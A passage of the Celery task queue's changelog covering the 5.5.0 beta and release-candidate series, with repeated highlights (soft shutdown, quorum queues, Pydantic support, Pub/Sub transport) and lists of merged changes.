.. _changelog:

================
 Change history
================

This document contains change notes for bugfix & new features
in the main branch & 5.5.x series, please see :ref:`whatsnew-5.5` for
an overview of what's new in Celery 5.5.

.. _version-5.5.0rc4:

5.5.0rc4
========

:release-date: 2024-12-19
:release-by: Tomer Nosrati

Celery v5.5.0 Release Candidate 4 is now available for testing.
Please help us test this version and report any issues.

Key Highlights
~~~~~~~~~~~~~~

See :ref:`whatsnew-5.5` or read the main highlights below.

Using Kombu 5.5.0rc2
--------------------

The minimum required Kombu version has been bumped to 5.5.0.
Kombu is current at 5.5.0rc2.

Complete Quorum Queues Support
------------------------------

A completely new ETA mechanism was developed to allow full support with RabbitMQ Quorum Queues.

After upgrading to this version, please share your feedback on the quorum queues support.

Relevant Issues:
`#9207 <https://github.com/celery/celery/discussions/9207>`_,
`#6067 <https://github.com/celery/celery/discussions/6067>`_

- New :ref:`documentation <using-quorum-queues>`.
- New :setting:`broker_native_delayed_delivery_queue_type` configuration option.

New support for Google Pub/Sub transport
----------------------------------------

After upgrading to this version, please share your feedback on the Google Pub/Sub transport support.

Relevant Issues:
`#9351 <https://github.com/celery/celery/pull/9351>`_

Python 3.13 Improved Support
----------------------------

Additional dependencies have been migrated successfully to Python 3.13, including Kombu and py-amqp.

Soft Shutdown
-------------

The soft shutdown is a new mechanism in Celery that sits between the warm shutdown and the cold shutdown.
It sets a time limited "warm shutdown" period, during which the worker will continue to process tasks that are already running.
After the soft shutdown ends, the worker will initiate a graceful cold shutdown, stopping all tasks and exiting.

The soft shutdown is disabled by default, and can be enabled by setting the new configuration option :setting:`worker_soft_shutdown_timeout`.
If a worker is not running any task when the soft shutdown initiates, it will skip the warm shutdown period and proceed directly to the cold shutdown
unless the new configuration option :setting:`worker_enable_soft_shutdown_on_idle` is set to True. This is useful for workers
that are idle, waiting on ETA tasks to be executed that still want to enable the soft shutdown anyways.

The soft shutdown can replace the cold shutdown when using a broker with a visibility timeout mechanism, like :ref:`Redis <broker-redis>`
or :ref:`SQS <broker-sqs>`, to enable a more graceful cold shutdown procedure, allowing the worker enough time to re-queue tasks that were not
completed (e.g., ``Restoring 1 unacknowledged message(s)``) by resetting the visibility timeout of the unacknowledged messages just before
the worker exits completely.

After upgrading to this version, please share your feedback on the new Soft Shutdown mechanism.

Relevant Issues:
`#9213 <https://github.com/celery/celery/pull/9213>`_,
`#9231 <https://github.com/celery/celery/pull/9231>`_,
`#9238 <https://github.com/celery/celery/pull/9238>`_

- New :ref:`documentation <worker-stopping>` for each shutdown type.
- New :setting:`worker_soft_shutdown_timeout` configuration option.
- New :setting:`worker_enable_soft_shutdown_on_idle` configuration option.

REMAP_SIGTERM
-------------

The ``REMAP_SIGTERM`` "hidden feature" has been tested, :ref:`documented <worker-REMAP_SIGTERM>` and is now officially supported.
This feature allows users to remap the SIGTERM signal to SIGQUIT, to initiate a soft or a cold shutdown using :sig:`TERM`
instead of :sig:`QUIT`.

Pydantic Support
----------------

This release introduces support for Pydantic models in Celery tasks.
For more info, see the new pydantic example and PR `#9023 <https://github.com/celery/celery/pull/9023>`_ by @mathiasertl.

After upgrading to this version, please share your feedback on the new Pydantic support.

Redis Broker Stability Improvements
-----------------------------------
The root cause of the Redis broker instability issue has been `identified and resolved <https://github.com/celery/kombu/pull/2007>`_
in the v5.4.0 release of Kombu, which should resolve the disconnections bug and offer additional improvements.

After upgrading to this version, please share your feedback on the Redis broker stability.

Relevant Issues:
`#7276 <https://github.com/celery/celery/discussions/7276>`_,
`#8091 <https://github.com/celery/celery/discussions/8091>`_,
`#8030 <https://github.com/celery/celery/discussions/8030>`_,
`#8384 <https://github.com/celery/celery/discussions/8384>`_

Quorum Queues Initial Support
-----------------------------
This release introduces the initial support for Quorum Queues with Celery. 

See new configuration options for more details:

- :setting:`task_default_queue_type`
- :setting:`worker_detect_quorum_queues`

After upgrading to this version, please share your feedback on the Quorum Queues support.

Relevant Issues:
`#6067 <https://github.com/celery/celery/discussions/6067>`_,
`#9121 <https://github.com/celery/celery/discussions/9121>`_

What's Changed
~~~~~~~~~~~~~~

- Bugfix: SIGQUIT not initiating cold shutdown when `task_acks_late=False` (#9461)
- Fixed pycurl dep with Python 3.8 (#9471)
- Update elasticsearch requirement from <=8.16.0 to <=8.17.0 (#9469)
- Bump pytest-subtests from 0.13.1 to 0.14.1 (#9459)
- documentation: Added a type annotation to the periodic task example (#9473)
- Prepare for (pre) release: v5.5.0rc4 (#9474)

.. _version-5.5.0rc3:

5.5.0rc3
========

:release-date: 2024-12-03
:release-by: Tomer Nosrati

Celery v5.5.0 Release Candidate 3 is now available for testing.
Please help us test this version and report any issues.

Key Highlights
~~~~~~~~~~~~~~

See :ref:`whatsnew-5.5` or read the main highlights below.

Using Kombu 5.5.0rc2
--------------------

The minimum required Kombu version has been bumped to 5.5.0.
Kombu is current at 5.5.0rc2.

Complete Quorum Queues Support
------------------------------

A completely new ETA mechanism was developed to allow full support with RabbitMQ Quorum Queues.

After upgrading to this version, please share your feedback on the quorum queues support.

Relevant Issues:
`#9207 <https://github.com/celery/celery/discussions/9207>`_,
`#6067 <https://github.com/celery/celery/discussions/6067>`_

- New :ref:`documentation <using-quorum-queues>`.
- New :setting:`broker_native_delayed_delivery_queue_type` configuration option.

New support for Google Pub/Sub transport
----------------------------------------

After upgrading to this version, please share your feedback on the Google Pub/Sub transport support.

Relevant Issues:
`#9351 <https://github.com/celery/celery/pull/9351>`_

Python 3.13 Improved Support
----------------------------

Additional dependencies have been migrated successfully to Python 3.13, including Kombu and py-amqp.

Soft Shutdown
-------------

The soft shutdown is a new mechanism in Celery that sits between the warm shutdown and the cold shutdown.
It sets a time limited "warm shutdown" period, during which the worker will continue to process tasks that are already running.
After the soft shutdown ends, the worker will initiate a graceful cold shutdown, stopping all tasks and exiting.

The soft shutdown is disabled by default, and can be enabled by setting the new configuration option :setting:`worker_soft_shutdown_timeout`.
If a worker is not running any task when the soft shutdown initiates, it will skip the warm shutdown period and proceed directly to the cold shutdown
unless the new configuration option :setting:`worker_enable_soft_shutdown_on_idle` is set to True. This is useful for workers
that are idle, waiting on ETA tasks to be executed that still want to enable the soft shutdown anyways.

The soft shutdown can replace the cold shutdown when using a broker with a visibility timeout mechanism, like :ref:`Redis <broker-redis>`
or :ref:`SQS <broker-sqs>`, to enable a more graceful cold shutdown procedure, allowing the worker enough time to re-queue tasks that were not
completed (e.g., ``Restoring 1 unacknowledged message(s)``) by resetting the visibility timeout of the unacknowledged messages just before
the worker exits completely.

After upgrading to this version, please share your feedback on the new Soft Shutdown mechanism.

Relevant Issues:
`#9213 <https://github.com/celery/celery/pull/9213>`_,
`#9231 <https://github.com/celery/celery/pull/9231>`_,
`#9238 <https://github.com/celery/celery/pull/9238>`_

- New :ref:`documentation <worker-stopping>` for each shutdown type.
- New :setting:`worker_soft_shutdown_timeout` configuration option.
- New :setting:`worker_enable_soft_shutdown_on_idle` configuration option.

REMAP_SIGTERM
-------------

The ``REMAP_SIGTERM`` "hidden feature" has been tested, :ref:`documented <worker-REMAP_SIGTERM>` and is now officially supported.
This feature allows users to remap the SIGTERM signal to SIGQUIT, to initiate a soft or a cold shutdown using :sig:`TERM`
instead of :sig:`QUIT`.

Pydantic Support
----------------

This release introduces support for Pydantic models in Celery tasks.
For more info, see the new pydantic example and PR `#9023 <https://github.com/celery/celery/pull/9023>`_ by @mathiasertl.

After upgrading to this version, please share your feedback on the new Pydantic support.

Redis Broker Stability Improvements
-----------------------------------
The root cause of the Redis broker instability issue has been `identified and resolved <https://github.com/celery/kombu/pull/2007>`_
in the v5.4.0 release of Kombu, which should resolve the disconnections bug and offer additional improvements.

After upgrading to this version, please share your feedback on the Redis broker stability.

Relevant Issues:
`#7276 <https://github.com/celery/celery/discussions/7276>`_,
`#8091 <https://github.com/celery/celery/discussions/8091>`_,
`#8030 <https://github.com/celery/celery/discussions/8030>`_,
`#8384 <https://github.com/celery/celery/discussions/8384>`_

Quorum Queues Initial Support
-----------------------------
This release introduces the initial support for Quorum Queues with Celery. 

See new configuration options for more details:

- :setting:`task_default_queue_type`
- :setting:`worker_detect_quorum_queues`

After upgrading to this version, please share your feedback on the Quorum Queues support.

Relevant Issues:
`#6067 <https://github.com/celery/celery/discussions/6067>`_,
`#9121 <https://github.com/celery/celery/discussions/9121>`_

What's Changed
~~~~~~~~~~~~~~

- Document usage of broker_native_delayed_delivery_queue_type (#9419)
- Adjust section in what's new document regarding quorum queues support (#9420)
- Update pytest-rerunfailures to 15.0 (#9422)
- Document group unrolling (#9421)
- fix small typo acces -> access (#9434)
- Update cryptography to 44.0.0 (#9437)
- Added pypy to Dockerfile (#9438)
- Skipped flaky tests on pypy (all pass after ~10 reruns) (#9439)
- Allowing managed credentials for azureblockblob (#9430)
- Allow passing Celery objects to the Click entry point (#9426)
- support Request termination for gevent (#9440)
- Prevent event_mask from being overwritten. (#9432)
- Update pytest to 8.3.4 (#9444)
- Prepare for (pre) release: v5.5.0rc3 (#9450)

.. _version-5.5.0rc2:

5.5.0rc2
========

:release-date: 2024-11-18
:release-by: Tomer Nosrati

Celery v5.5.0 Release Candidate 2 is now available for testing.
Please help us test this version and report any issues.

Key Highlights
~~~~~~~~~~~~~~

See :ref:`whatsnew-5.5` or read the main highlights below.

Using Kombu 5.5.0rc2
--------------------

The minimum required Kombu version has been bumped to 5.5.0.
Kombu is current at 5.5.0rc2.

Complete Quorum Queues Support
------------------------------

A completely new ETA mechanism was developed to allow full support with RabbitMQ Quorum Queues.

After upgrading to this version, please share your feedback on the quorum queues support.

Relevant Issues:
`#9207 <https://github.com/celery/celery/discussions/9207>`_,
`#6067 <https://github.com/celery/celery/discussions/6067>`_

- New :ref:`documentation <using-quorum-queues>`.
- New :setting:`broker_native_delayed_delivery_queue_type` configuration option.

New support for Google Pub/Sub transport
----------------------------------------

After upgrading to this version, please share your feedback on the Google Pub/Sub transport support.

Relevant Issues:
`#9351 <https://github.com/celery/celery/pull/9351>`_

Python 3.13 Improved Support
----------------------------

Additional dependencies have been migrated successfully to Python 3.13, including Kombu and py-amqp.

Previous Pre-release Highlights
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Python 3.13 Initial Support
---------------------------

This release introduces the initial support for Python 3.13 with Celery.

After upgrading to this version, please share your feedback on the Python 3.13 support.

Soft Shutdown
-------------

The soft shutdown is a new mechanism in Celery that sits between the warm shutdown and the cold shutdown.
It sets a time limited "warm shutdown" period, during which the worker will continue to process tasks that are already running.
After the soft shutdown ends, the worker will initiate a graceful cold shutdown, stopping all tasks and exiting.

The soft shutdown is disabled by default, and can be enabled by setting the new configuration option :setting:`worker_soft_shutdown_timeout`.
If a worker is not running any task when the soft shutdown initiates, it will skip the warm shutdown period and proceed directly to the cold shutdown
unless the new configuration option :setting:`worker_enable_soft_shutdown_on_idle` is set to True. This is useful for workers
that are idle, waiting on ETA tasks to be executed that still want to enable the soft shutdown anyways.

The soft shutdown can replace the cold shutdown when using a broker with a visibility timeout mechanism, like :ref:`Redis <broker-redis>`
or :ref:`SQS <broker-sqs>`, to enable a more graceful cold shutdown procedure, allowing the worker enough time to re-queue tasks that were not
completed (e.g., ``Restoring 1 unacknowledged message(s)``) by resetting the visibility timeout of the unacknowledged messages just before
the worker exits completely.

After upgrading to this version, please share your feedback on the new Soft Shutdown mechanism.

Relevant Issues:
`#9213 <https://github.com/celery/celery/pull/9213>`_,
`#9231 <https://github.com/celery/celery/pull/9231>`_,
`#9238 <https://github.com/celery/celery/pull/9238>`_

- New :ref:`documentation <worker-stopping>` for each shutdown type.
- New :setting:`worker_soft_shutdown_timeout` configuration option.
- New :setting:`worker_enable_soft_shutdown_on_idle` configuration option.

REMAP_SIGTERM
-------------

The ``REMAP_SIGTERM`` "hidden feature" has been tested, :ref:`documented <worker-REMAP_SIGTERM>` and is now officially supported.
This feature allows users to remap the SIGTERM signal to SIGQUIT, to initiate a soft or a cold shutdown using :sig:`TERM`
instead of :sig:`QUIT`.

Pydantic Support
----------------

This release introduces support for Pydantic models in Celery tasks.
For more info, see the new pydantic example and PR `#9023 <https://github.com/celery/celery/pull/9023>`_ by @mathiasertl.

After upgrading to this version, please share your feedback on the new Pydantic support.

Redis Broker Stability Improvements
-----------------------------------
The root cause of the Redis broker instability issue has been `identified and resolved <https://github.com/celery/kombu/pull/2007>`_
in the v5.4.0 release of Kombu, which should resolve the disconnections bug and offer additional improvements.

After upgrading to this version, please share your feedback on the Redis broker stability.

Relevant Issues:
`#7276 <https://github.com/celery/celery/discussions/7276>`_,
`#8091 <https://github.com/celery/celery/discussions/8091>`_,
`#8030 <https://github.com/celery/celery/discussions/8030>`_,
`#8384 <https://github.com/celery/celery/discussions/8384>`_

Quorum Queues Initial Support
-----------------------------
This release introduces the initial support for Quorum Queues with Celery. 

See new configuration options for more details:

- :setting:`task_default_queue_type`
- :setting:`worker_detect_quorum_queues`

After upgrading to this version, please share your feedback on the Quorum Queues support.

Relevant Issues:
`#6067 <https://github.com/celery/celery/discussions/6067>`_,
`#9121 <https://github.com/celery/celery/discussions/9121>`_

What's Changed
~~~~~~~~~~~~~~

- Fix: Treat dbm.error as a corrupted schedule file (#9331)
- Pin pre-commit to latest version 4.0.1 (#9343)
- Added Python 3.13 to Dockerfiles (#9350)
- Skip test_pool_restart_import_modules on PyPy due to test issue (#9352)
- Update elastic-transport requirement from <=8.15.0 to <=8.15.1 (#9347)
- added dragonfly logo (#9353)
- Update README.rst (#9354)
- Update README.rst (#9355)
- Update mypy to 1.12.0 (#9356)
- Bump Kombu to v5.5.0rc1 (#9357)
- Fix `celery --loader` option parsing (#9361)
- Add support for Google Pub/Sub transport (#9351)
- Add native incr support for GCSBackend (#9302)
- fix(perform_pending_operations): prevent task duplication on shutdown… (#9348)
- Update grpcio to 1.67.0 (#9365)
- Update google-cloud-firestore to 2.19.0 (#9364)
- Annotate celery/utils/timer2.py (#9362)
- Update cryptography to 43.0.3 (#9366)
- Update mypy to 1.12.1 (#9368)
- Bump mypy from 1.12.1 to 1.13.0 (#9373)
- Pass timeout and confirm_timeout to producer.publish() (#9374)
- Bump Kombu to v5.5.0rc2 (#9382)
- Bump pytest-cov from 5.0.0 to 6.0.0 (#9388)
- default strict to False for pydantic tasks (#9393)
- Only log that global QoS is disabled if using amqp (#9395)
- chore: update sponsorship logo (#9398)
- Allow custom hostname for celery_worker in celery.contrib.pytest / celery.contrib.testing.worker (#9405)
- Removed docker-docs from CI (optional job, malfunctioning) (#9406)
- Added a utility to format changelogs from the auto-generated GitHub release notes (#9408)
- Bump codecov/codecov-action from 4 to 5 (#9412)
- Update elasticsearch requirement from <=8.15.1 to <=8.16.0 (#9410)
- Native Delayed Delivery in RabbitMQ (#9207)
- Prepare for (pre) release: v5.5.0rc2 (#9416)

.. _version-5.5.0rc1:

5.5.0rc1
========

:release-date: 2024-10-08
:release-by: Tomer Nosrati

Celery v5.5.0 Release Candidate 1 is now available for testing.
Please help us test this version and report any issues.

Key Highlights
~~~~~~~~~~~~~~

See :ref:`whatsnew-5.5` or read the main highlights below.

Python 3.13 Initial Support
---------------------------

This release introduces the initial support for Python 3.13 with Celery.

After upgrading to this version, please share your feedback on the Python 3.13 support.

Soft Shutdown
-------------

The soft shutdown is a new mechanism in Celery that sits between the warm shutdown and the cold shutdown.
It sets a time limited "warm shutdown" period, during which the worker will continue to process tasks that are already running.
After the soft shutdown ends, the worker will initiate a graceful cold shutdown, stopping all tasks and exiting.

The soft shutdown is disabled by default, and can be enabled by setting the new configuration option :setting:`worker_soft_shutdown_timeout`.
If a worker is not running any task when the soft shutdown initiates, it will skip the warm shutdown period and proceed directly to the cold shutdown
unless the new configuration option :setting:`worker_enable_soft_shutdown_on_idle` is set to True. This is useful for workers
that are idle, waiting on ETA tasks to be executed that still want to enable the soft shutdown anyways.

The soft shutdown can replace the cold shutdown when using a broker with a visibility timeout mechanism, like :ref:`Redis <broker-redis>`
or :ref:`SQS <broker-sqs>`, to enable a more graceful cold shutdown procedure, allowing the worker enough time to re-queue tasks that were not
completed (e.g., ``Restoring 1 unacknowledged message(s)``) by resetting the visibility timeout of the unacknowledged messages just before
the worker exits completely.

After upgrading to this version, please share your feedback on the new Soft Shutdown mechanism.

Relevant Issues:
`#9213 <https://github.com/celery/celery/pull/9213>`_,
`#9231 <https://github.com/celery/celery/pull/9231>`_,
`#9238 <https://github.com/celery/celery/pull/9238>`_

- New :ref:`documentation <worker-stopping>` for each shutdown type.
- New :setting:`worker_soft_shutdown_timeout` configuration option.
- New :setting:`worker_enable_soft_shutdown_on_idle` configuration option.

REMAP_SIGTERM
-------------

The ``REMAP_SIGTERM`` "hidden feature" has been tested, :ref:`documented <worker-REMAP_SIGTERM>` and is now officially supported.
This feature allows users to remap the SIGTERM signal to SIGQUIT, to initiate a soft or a cold shutdown using :sig:`TERM`
instead of :sig:`QUIT`.

Pydantic Support
----------------

This release introduces support for Pydantic models in Celery tasks.
For more info, see the new pydantic example and PR `#9023 <https://github.com/celery/celery/pull/9023>`_ by @mathiasertl.

After upgrading to this version, please share your feedback on the new Pydantic support.

Redis Broker Stability Improvements
-----------------------------------
The root cause of the Redis broker instability issue has been `identified and resolved <https://github.com/celery/kombu/pull/2007>`_
in the v5.4.0 release of Kombu, which should resolve the disconnections bug and offer additional improvements.

After upgrading to this version, please share your feedback on the Redis broker stability.

Relevant Issues:
`#7276 <https://github.com/celery/celery/discussions/7276>`_,
`#8091 <https://github.com/celery/celery/discussions/8091>`_,
`#8030 <https://github.com/celery/celery/discussions/8030>`_,
`#8384 <https://github.com/celery/celery/discussions/8384>`_

Quorum Queues Initial Support
-----------------------------
This release introduces the initial support for Quorum Queues with Celery. 

See new configuration options for more details:

- :setting:`task_default_queue_type`
- :setting:`worker_detect_quorum_queues`

After upgrading to this version, please share your feedback on the Quorum Queues support.

Relevant Issues:
`#6067 <https://github.com/celery/celery/discussions/6067>`_,
`#9121 <https://github.com/celery/celery/discussions/9121>`_

What's Changed
~~~~~~~~~~~~~~

- Added Blacksmith.sh to the Sponsors section in the README (#9323)
- Revert "Added Blacksmith.sh to the Sponsors section in the README" (#9324)
- Added Blacksmith.sh to the Sponsors section in the README (#9325)
- Added missing " |oc-sponsor-3|” in README (#9326)
- Use Blacksmith SVG logo (#9327)
- Updated Blacksmith SVG logo (#9328)
- Revert "Updated Blacksmith SVG logo" (#9329)
- Update pymongo to 4.10.0 (#9330)
- Update pymongo to 4.10.1 (#9332)
- Update user guide to recommend delay_on_commit (#9333)
- Pin pre-commit to latest version 4.0.0 (Python 3.9+) (#9334)
- Update ephem to 4.1.6 (#9336)
- Updated Blacksmith SVG logo (#9337)
- Prepare for (pre) release: v5.5.0rc1 (#9341)

.. _version-5.5.0b4:

5.5.0b4
=======

:release-date: 2024-09-30
:release-by: Tomer Nosrati

Celery v5.5.0 Beta 4 is now available for testing.
Please help us test this version and report any issues.

Key Highlights
~~~~~~~~~~~~~~

Python 3.13 Initial Support
---------------------------

This release introduces the initial support for Python 3.13 with Celery.

After upgrading to this version, please share your feedback on the Python 3.13 support.

Previous Pre-release Highlights
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Soft Shutdown
-------------

The soft shutdown is a new mechanism in Celery that sits between the warm shutdown and the cold shutdown.
It sets a time limited "warm shutdown" period, during which the worker will continue to process tasks that are already running.
After the soft shutdown ends, the worker will initiate a graceful cold shutdown, stopping all tasks and exiting.

The soft shutdown is disabled by default, and can be enabled by setting the new configuration option :setting:`worker_soft_shutdown_timeout`.
If a worker is not running any task when the soft shutdown initiates, it will skip the warm shutdown period and proceed directly to the cold shutdown
unless the new configuration option :setting:`worker_enable_soft_shutdown_on_idle` is set to True. This is useful for workers
that are idle, waiting on ETA tasks to be executed that still want to enable the soft shutdown anyways.

The soft shutdown can replace the cold shutdown when using a broker with a visibility timeout mechanism, like :ref:`Redis <broker-redis>`
or :ref:`SQS <broker-sqs>`, to enable a more graceful cold shutdown procedure, allowing the worker enough time to re-queue tasks that were not
completed (e.g., ``Restoring 1 unacknowledged message(s)``) by resetting the visibility timeout of the unacknowledged messages just before
the worker exits completely.

After upgrading to this version, please share your feedback on the new Soft Shutdown mechanism.

Relevant Issues:
`#9213 <https://github.com/celery/celery/pull/9213>`_,
`#9231 <https://github.com/celery/celery/pull/9231>`_,
`#9238 <https://github.com/celery/celery/pull/9238>`_

- New :ref:`documentation <worker-stopping>` for each shutdown type.
- New :setting:`worker_soft_shutdown_timeout` configuration option.
- New :setting:`worker_enable_soft_shutdown_on_idle` configuration option.

REMAP_SIGTERM
-------------

The ``REMAP_SIGTERM`` "hidden feature" has been tested, :ref:`documented <worker-REMAP_SIGTERM>` and is now officially supported.
This feature allows users to remap the SIGTERM signal to SIGQUIT, to initiate a soft or a cold shutdown using :sig:`TERM`
instead of :sig:`QUIT`.

Pydantic Support
----------------

This release introduces support for Pydantic models in Celery tasks.
For more info, see the new pydantic example and PR `#9023 <https://github.com/celery/celery/pull/9023>`_ by @mathiasertl.

After upgrading to this version, please share your feedback on the new Pydantic support.

Redis Broker Stability Improvements
-----------------------------------
The root cause of the Redis broker instability issue has been `identified and resolved <https://github.com/celery/kombu/pull/2007>`_
in the v5.4.0 release of Kombu, which should resolve the disconnections bug and offer additional improvements.

After upgrading to this version, please share your feedback on the Redis broker stability.

Relevant Issues:
`#7276 <https://github.com/celery/celery/discussions/7276>`_,
`#8091 <https://github.com/celery/celery/discussions/8091>`_,
`#8030 <https://github.com/celery/celery/discussions/8030>`_,
`#8384 <https://github.com/celery/celery/discussions/8384>`_

Quorum Queues Initial Support
-----------------------------
This release introduces the initial support for Quorum Queues with Celery. 

See new configuration options for more details:

- :setting:`task_default_queue_type`
- :setting:`worker_detect_quorum_queues`

After upgrading to this version, please share your feedback on the Quorum Queues support.

Relevant Issues:
`#6067 <https://github.com/celery/celery/discussions/6067>`_,
`#9121 <https://github.com/celery/celery/discussions/9121>`_

What's Changed
~~~~~~~~~~~~~~

- Correct the error description in exception message when validate soft_time_limit (#9246)
- Update msgpack to 1.1.0 (#9249)
- chore(utils/time.py): rename `_is_ambigious` -> `_is_ambiguous` (#9248)
- Reduced Smoke Tests to min/max supported python (3.8/3.12) (#9252)
- Update pytest to 8.3.3 (#9253)
- Update elasticsearch requirement from <=8.15.0 to <=8.15.1 (#9255)
- Update mongodb without deprecated `[srv]` extra requirement (#9258)
- blacksmith.sh: Migrate workflows to Blacksmith (#9261)
- Fixes #9119: inject dispatch_uid for retry-wrapped receivers (#9247)
- Run all smoke tests CI jobs together (#9263)
- Improve documentation on visibility timeout (#9264)
- Bump pytest-celery to 1.1.2 (#9267)
- Added missing "app.conf.visibility_timeout" in smoke tests (#9266)
- Improved stability with t/smoke/tests/test_consumer.py (#9268)
- Improved Redis container stability in the smoke tests (#9271)
- Disabled EXHAUST_MEMORY tests in Smoke-tasks (#9272)
- Marked xfail for test_reducing_prefetch_count with Redis - flaky test (#9273)
- Fixed pypy unit tests random failures in the CI (#9275)
- Fixed more pypy unit tests random failures in the CI (#9278)
- Fix Redis container from aborting randomly (#9276)
- Run Integration & Smoke CI tests together after unit tests pass (#9280)
- Added "loglevel verbose" to Redis containers in smoke tests (#9282)
- Fixed Redis error in the smoke tests: "Possible SECURITY ATTACK detected" (#9284)
- Refactored the smoke tests github workflow (#9285)
- Increased --reruns 3->4 in smoke tests (#9286)
- Improve stability of smoke tests (CI and Local) (#9287)
- Fixed Smoke tests CI "test-case" labels (specific instead of general) (#9288)
- Use assert_log_exists instead of wait_for_log in worker smoke tests (#9290)
- Optimized t/smoke/tests/test_worker.py (#9291)
- Enable smoke tests dockers check before each test starts (#9292)
- Relaxed smoke tests flaky tests mechanism (#9293)
- Updated quorum queue detection to handle multiple broker instances (#9294)
- Non-lazy table creation for database backend (#9228)
- Pin pymongo to latest version 4.9 (#9297)
- Bump pymongo from 4.9 to 4.9.1 (#9298)
- Bump Kombu to v5.4.2 (#9304)
- Use rabbitmq:3 in stamping smoke tests (#9307)
- Bump pytest-celery to 1.1.3 (#9308)
- Added Python 3.13 Support (#9309)
- Add log when global qos is disabled (#9296)
- Added official release docs (whatsnew) for v5.5 (#9312)
- Enable Codespell autofix (#9313)
- Pydantic typehints: Fix optional, allow generics (#9319)
- Prepare for (pre) release: v5.5.0b4 (#9322)

.. _version-5.5.0b3:

5.5.0b3
=======

:release-date: 2024-09-08
:release-by: Tomer Nosrati

Celery v5.5.0 Beta 3 is now available for testing.
Please help us test this version and report any issues.

Key Highlights
~~~~~~~~~~~~~~

Soft Shutdown
-------------

The soft shutdown is a new mechanism in Celery that sits between the warm shutdown and the cold shutdown.
It sets a time limited "warm shutdown" period, during which the worker will continue to process tasks that are already running.
After the soft shutdown ends, the worker will initiate a graceful cold shutdown, stopping all tasks and exiting.

The soft shutdown is disabled by default, and can be enabled by setting the new configuration option :setting:`worker_soft_shutdown_timeout`.
If a worker is not running any task when the soft shutdown initiates, it will skip the warm shutdown period and proceed directly to the cold shutdown
unless the new configuration option :setting:`worker_enable_soft_shutdown_on_idle` is set to True. This is useful for workers
that are idle, waiting on ETA tasks to be executed that still want to enable the soft shutdown anyways.

The soft shutdown can replace the cold shutdown when using a broker with a visibility timeout mechanism, like :ref:`Redis <broker-redis>`
or :ref:`SQS <broker-sqs>`, to enable a more graceful cold shutdown procedure, allowing the worker enough time to re-queue tasks that were not
completed (e.g., ``Restoring 1 unacknowledged message(s)``) by resetting the visibility timeout of the unacknowledged messages just before
the worker exits completely.

After upgrading to this version, please share your feedback on the new Soft Shutdown mechanism.

Relevant Issues:
`#9213 <https://github.com/celery/celery/pull/9213>`_,
`#9231 <https://github.com/celery/celery/pull/9231>`_,
`#9238 <https://github.com/celery/celery/pull/9238>`_

- New :ref:`documentation <worker-stopping>` for each shutdown type.
- New :setting:`worker_soft_shutdown_timeout` configuration option.
- New :setting:`worker_enable_soft_shutdown_on_idle` configuration option.

REMAP_SIGTERM
-------------

The ``REMAP_SIGTERM`` "hidden feature" has been tested, :ref:`documented <worker-REMAP_SIGTERM>` and is now officially supported.
This feature allows users to remap the SIGTERM signal to SIGQUIT, to initiate a soft or a cold shutdown using :sig:`TERM`
instead of :sig:`QUIT`.

Previous Pre-release Highlights
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Pydantic Support
----------------

This release introduces support for Pydantic models in Celery tasks.
For more info, see the new pydantic example and PR `#9023 <https://github.com/celery/celery/pull/9023>`_ by @mathiasertl.

After upgrading to this version, please share your feedback on the new Pydantic support.

Redis Broker Stability Improvements
-----------------------------------
The root cause of the Redis broker instability issue has been `identified and resolved <https://github.com/celery/kombu/pull/2007>`_
in the v5.4.0 release of Kombu, which should resolve the disconnections bug and offer additional improvements.

After upgrading to this version, please share your feedback on the Redis broker stability.

Relevant Issues:
`#7276 <https://github.com/celery/celery/discussions/7276>`_,
`#8091 <https://github.com/celery/celery/discussions/8091>`_,
`#8030 <https://github.com/celery/celery/discussions/8030>`_,
`#8384 <https://github.com/celery/celery/discussions/8384>`_

Quorum Queues Initial Support
-----------------------------
This release introduces the initial support for Quorum Queues with Celery. 

See new configuration options for more details:

- :setting:`task_default_queue_type`
- :setting:`worker_detect_quorum_queues`

After upgrading to this version, please share your feedback on the Quorum Queues support.

Relevant Issues:
`#6067 <https://github.com/celery/celery/discussions/6067>`_,
`#9121 <https://github.com/celery/celery/discussions/9121>`_

What's Changed
~~~~~~~~~~~~~~

- Added SQS (localstack) broker to canvas smoke tests (#9179)
- Pin elastic-transport to <= latest version 8.15.0 (#9182)
- Update elasticsearch requirement from <=8.14.0 to <=8.15.0 (#9186)
- Improve formatting (#9188)
- Add basic helm chart for celery (#9181)
- Update kafka.rst (#9194)
- Update pytest-order to 1.3.0 (#9198)
- Update mypy to 1.11.2 (#9206)
- All added to routes (#9204)
- Fix typos discovered by codespell (#9212)
- Use tzdata extras with zoneinfo backports (#8286)
- Use `docker compose` in Contributing's doc build section (#9219)
- Failing test for issue #9119 (#9215)
- Fix date_done timezone issue (#8385)
- CI Fixes to smoke tests (#9223)
- Fix: passes current request context when pushing to request_stack (#9208)
- Fix broken link in the Using RabbitMQ docs page (#9226)
- Added Soft Shutdown Mechanism (#9213)
- Added worker_enable_soft_shutdown_on_idle (#9231)
- Bump cryptography from 43.0.0 to 43.0.1 (#9233)
- Added docs regarding the relevancy of soft shutdown and ETA tasks (#9238)
- Show broker_connection_retry_on_startup warning only if it evaluates as False (#9227)
- Fixed docker-docs CI failure (#9240)
- Added docker cleanup auto-fixture to improve smoke tests stability (#9243)
- print is not thread-safe, so should not be used in signal handler (#9222)
- Prepare for (pre) release: v5.5.0b3 (#9244)

.. _version-5.5.0b2:

5.5.0b2
=======

:release-date: 2024-08-06
:release-by: Tomer Nosrati

Celery v5.5.0 Beta 2 is now available for testing.
Please help us test this version and report any issues.

Key Highlights
~~~~~~~~~~~~~~

Pydantic Support
----------------

This release introduces support for Pydantic models in Celery tasks.
For more info, see the new pydantic example and PR `#9023 <https://github.com/celery/celery/pull/9023>`_ by @mathiasertl.

After upgrading to this version, please share your feedback on the new Pydantic support.

Previous Beta Highlights
~~~~~~~~~~~~~~~~~~~~~~~~

Redis Broker Stability Improvements
-----------------------------------
The root cause of the Redis broker instability issue has been `identified and resolved <https://github.com/celery/kombu/pull/2007>`_
in the v5.4.0 release of Kombu, which should resolve the disconnections bug and offer additional improvements.

After upgrading to this version, please share your feedback on the Redis broker stability.

Relevant Issues:
`#7276 <https://github.com/celery/celery/discussions/7276>`_,
`#8091 <https://github.com/celery/celery/discussions/8091>`_,
`#8030 <https://github.com/celery/celery/discussions/8030>`_,
`#8384 <https://github.com/celery/celery/discussions/8384>`_

Quorum Queues Initial Support
-----------------------------
This release introduces the initial support for Quorum Queues with Celery. 

See new configuration options for more details:

